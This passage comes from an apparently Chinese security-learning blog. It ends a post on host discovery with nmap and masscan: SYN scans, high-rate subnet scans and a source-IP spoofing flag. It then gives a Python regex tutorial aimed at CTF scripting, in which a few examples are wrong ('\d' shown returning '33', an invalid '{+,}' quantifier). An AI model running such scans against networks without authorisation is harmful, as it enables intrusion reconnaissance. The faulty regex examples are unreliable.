<h4 id="4、嗅探主机（nmap）"><a href="#4、嗅探主机（nmap）" class="headerlink" title="4、嗅探主机（nmap）"></a>4、嗅探主机（nmap）</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMP扫描： nmap -sP <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">检测目标操作系统： -O</span><br><span class="line">SYN扫描  ： -sS</span><br><span class="line">操作系统版本检测： -sV</span><br><span class="line">nmap -sS -p <span class="number">1337</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h4 id="5、嗅探主机-MASSCAN"><a href="#5、嗅探主机-MASSCAN" class="headerlink" title="5、嗅探主机(MASSCAN)"></a>5、嗅探主机(MASSCAN)</h4><p><strong>安装</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install clang git gcc make libpcap-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/robertdavidgraham/masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure>

<p><strong>单端口扫描</strong></p>
<p>扫描443端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p443</span><br></pre></td></tr></table></figure>

<p><strong>多端口扫描</strong></p>
<p>扫描80或443端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p80,<span class="number">443</span></span><br></pre></td></tr></table></figure>

<p><strong>扫描一系列端口</strong></p>
<p>扫描22到25端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p22<span class="number">-25</span></span><br></pre></td></tr></table></figure>

<p><strong>快速扫描</strong></p>
<p>使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。</p>
<p>默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。</p>
<p>扫描100个常见端口的B类子网，每秒100,000个数据包</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> -rate <span class="number">100000</span></span><br></pre></td></tr></table></figure>

<p>你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。</p>
<p><strong>排除目标</strong></p>
<p>因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。</p>
<p>扫描B类子网，但避免在exclude.txt中的</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> --excludefile exclude.txt</span><br></pre></td></tr></table></figure>

<p><strong>结果保存</strong></p>
<p>您可以使用标准的Unix重定向器将输出发送到文件：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> &gt; results.txt</span><br></pre></td></tr></table></figure>

<p> 除此之外，您还具有以下输出选项：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的XML。</span><br><span class="line">-oG <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的grepable格式。</span><br><span class="line">-oJ <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的JSON格式。</span><br></pre></td></tr></table></figure>

<p><strong>Nmap功能</strong></p>
<p>正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：</p>
<p>通过传递–nmap开关可以看到类似nmap的功能。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>-iL filename：从文件读取输入。</span><br><span class="line"><span class="bullet">2. </span>‐‐exclude host：在命令行中排除网络。</span><br><span class="line"><span class="bullet">3. </span>‐‐excludefile filename：从文件中排除网络。</span><br><span class="line"><span class="bullet">4. </span>-S：欺骗源IP。</span><br><span class="line"><span class="bullet">5. </span>-v interface：详细输出。</span><br><span class="line"><span class="bullet">6. </span>-vv interface：非常冗长的输出。</span><br><span class="line"><span class="bullet">7. </span>-e interface：使用指定的接口。</span><br><span class="line"><span class="bullet">8. </span>-e interface：使用指定的接口。</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><hr>
<p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p>
<p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/21/python 正则/">
                python 正则
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-21</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="python-正则"><a href="#python-正则" class="headerlink" title="python 正则"></a>python 正则</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前打CTF经常性的因为不会写脚本而去手撸，这大大降低了效率，而且有的题由于时间限制，显然手撸行不通。</p>
<p>而不会写脚本经常是因为自己不会处理得到的数据，如何过滤、拼接。所以今天学习一下python的re模块，正则替换，以及刚刚从Li4n0学长脚本中发现的字符表替换。</p>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><h4 id="元字符"><a href="#元字符" class="headerlink" title="^元字符"></a>^元字符</h4><p>字符串开始位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配s规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<p>[^a-z]反取，</p>
<p>匹配出除字母外的字符，^元字符如果写到字符集里就是反取</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"[^a-z]"</span>, <span class="string">"匹配s规则这s个字符串是否s匹配f规则则re则则则"</span>)   <span class="comment">#反取，匹配出除字母外的字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-1"><a href="#元字符-1" class="headerlink" title="$元字符"></a>$元字符</h4><p>字符串结束位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;a = re.findall(<span class="string">"匹配规则$"</span>, <span class="string">"这个字符串是否匹配规则"</span>)   <span class="comment">#字符串结束位置与匹配规则符合就匹配，否则不匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(a)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-2"><a href="#元字符-2" class="headerlink" title="*元字符"></a>*元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的*元字符）前面的一个字符可以是0个或多个原本字符</p>
<p>匹配前一个字符0或多次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<p>如果规则里只有一个分组，尽量避免用*否则会有可能匹配出空字符串</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则则则则则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"whether this string is matching?"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-3"><a href="#元字符-3" class="headerlink" title="+元字符"></a>+元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</p>
<p>匹配前一个字符1次或无限次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配+"</span>, <span class="string">"匹配配配配配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配配配配配'</span>, <span class="string">'匹配'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，和防止贪婪匹配"><a href="#元字符，和防止贪婪匹配" class="headerlink" title="?元字符，和防止贪婪匹配"></a>?元字符，和防止贪婪匹配</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</p>
<p>匹配一个字符0次或1次</p>
<p>还有一个功能是可以防止贪婪匹配，详情见防贪婪匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则?"</span>, <span class="string">"匹配规这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规'</span>, <span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'my title="sw engineer". His is "hello world"'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*?)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 如果没有 ?， 则会抓到最长的两个双引号之间的内容</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw enginee<span class="string">r". His is "</span>hello world</span><br></pre></td></tr></table></figure>



<h4 id="元字符-范围"><a href="#元字符-范围" class="headerlink" title="{}元字符,范围"></a>{}元字符,范围</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 {} 元字符）前面的一个字符，是自定义字符数，位数的原本字符</p>
<p>{m}匹配前一个字符m次，{m,n}匹配前一个字符m至n次，若省略n，则匹配m至无限次</p>
<p>{0,}匹配前一个字符0或多次,等同于*元字符<br>{+,}匹配前一个字符1次或无限次,等同于+元字符<br>{0,1}匹配前一个字符0次或1次,等同于?元字符</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;result = re.findall(<span class="string">"匹配规则&#123;3&#125;"</span>, <span class="string">"匹配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#&#123;m&#125;匹配前一个字符m次，&#123;m,n&#125;匹配前一个字符m至n次，若省略n，则匹配m至无限次</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">打印出 [<span class="string">'匹配规则则则'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="元字符-字符集"><a href="#元字符-字符集" class="headerlink" title="[]元字符,字符集"></a>[]元字符,字符集</h3><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</p>
<p>字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]。[^abc]表示取反，即非abc。所有特殊字符在字符集中都失去其原有的特殊含义。用\反斜杠转义 <strong>恢复</strong> 特殊字符的特殊含义。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则"</span>, <span class="string">"匹配a规则这个字符串是否匹配b规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配a规则'</span>, <span class="string">'匹配b规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则\t"</span>, <span class="string">"匹配a规则	这个字符串是否匹配b规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配a规则\t'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"><a href="#反斜杠后边跟普通字符实现特殊功能；（即预定义字符）" class="headerlink" title="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"></a>反斜杠后边跟普通字符实现特殊功能；（即预定义字符）</h4><p>预定义字符是在字符集和组里都是有用的</p>
<p>\d匹配任何十进制数，它相当于类[0-9]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure>

<p>\d+如果需要匹配一位或者多位数的数字时用</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'33'</span>,  <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure>

<p>\D匹配任何非数字字符，它相当于类[^0-9]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\D"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\D匹配任何非十进制数，它相当于类[^0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<p>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\s"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\s匹配任何空白字符，它相当于类[\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'\t'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">'\n'</span>]</span><br></pre></td></tr></table></figure>

<p>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\S"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'2'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'3'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'5'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'7'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<p>\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\w'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'h'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'p'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'c'</span>, <span class="string">'n'</span>, <span class="string">'b'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'g'</span>, <span class="string">'s'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure>

<p>\W匹配非任何字母数字字符包括下划线在内，它相当于类[^a-zA-Z0-9_]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\W'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\W不匹配包括下划线在内任何字母数字字符，它相当于类[^a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，分组"><a href="#元字符，分组" class="headerlink" title="()元字符，分组"></a>()元字符，分组</h4><p>也就是分组匹配，()里面的为一个组也可以理解成一个整体</p>
<p>如果()后面跟的是特殊元字符如   (adc)*   那么*控制的前导字符就是()里的整体内容，不再是前导一个字符</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="comment">#也就是分组匹配，()里面的为一个组也可以理解成一个整体</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"(a4)+"</span>, <span class="string">"a4a4a4a4a4dg4g654gb"</span>)   <span class="comment">#匹配一个或多个a4</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"a(\d+)"</span>,<span class="string">"a45646148a49a4a456048a45gg"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">9</span>), match=<span class="string">'a45646148'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure>

<h4 id="元字符，或"><a href="#元字符，或" class="headerlink" title="|元字符，或"></a>|元字符，或</h4><p>|或，或就是前后其中一个符合就匹配</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"你|好"</span>, <span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)   <span class="comment">#|或，或就是前后其中一个符合就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'你'</span>, <span class="string">'好'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a4a4a你|好dg4g654"</span>,<span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)</span><br><span class="line"><span 